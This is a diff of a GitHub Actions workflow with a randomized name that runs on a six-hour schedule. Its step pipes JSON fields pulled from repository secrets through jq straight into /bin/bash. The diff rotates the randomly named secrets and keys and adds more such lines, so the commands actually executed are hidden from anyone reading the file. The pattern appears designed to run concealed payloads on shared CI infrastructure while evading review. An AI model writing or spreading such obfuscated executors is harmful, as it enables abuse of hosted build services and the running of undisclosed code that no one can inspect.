@@ -2,23 +2,27 @@ name: piqijing4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 2/6 * * *'
-jobs:  # 24954
+    - cron: '2 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: piqijing4567
         env:
-          es59495: ${{ secrets.es59495 }}
+          xwfw34: ${{ secrets.xwfw34 }}
         run: |
-          echo $es59495 | jq -r .y0 | /bin/bash
-          echo $nqcr0649 | jq -r .iysfz964 | /bin/bash
-          echo $uvez09 | jq -r .wsee37116 | /bin/bash
-          echo $xzxq330 | jq -r .cc9493 | /bin/bash
-          echo $rnof64 | jq -r .ysae7065 | /bin/bash
-          echo $zdou0 | jq -r .op184 | /bin/bash
-          echo $p28 | jq -r .c1 | /bin/bash
-          echo $mz26 | jq -r .sogl90 | /bin/bash
+          echo $xwfw34 | jq -r .jdkp690 | /bin/bash
+          echo $tln3 | jq -r .qutjg85199 | /bin/bash
+          echo $besz6430 | jq -r .zr59398 | /bin/bash
+          echo $r4 | jq -r .xwt8 | /bin/bash
+          echo $hw8 | jq -r .f9967 | /bin/bash
+          echo $aqn621 | jq -r .nu3 | /bin/bash
+          echo $boi76 | jq -r .jbjv4723 | /bin/bash
+          echo $efb06215 | jq -r .zcjb961 | /bin/bash
+          echo $g1 | jq -r .wuuxa3844 | /bin/bash
+          echo $noe4956 | jq -r .bg37 | /bin/bash
+          echo $lnyjb85 | jq -r .nmmp41215 | /bin/bash
+          echo $x46 | jq -r .caxrd39 | /bin/bash
+          echo $t4 | jq -r .dwxm2 | /bin/bash
 
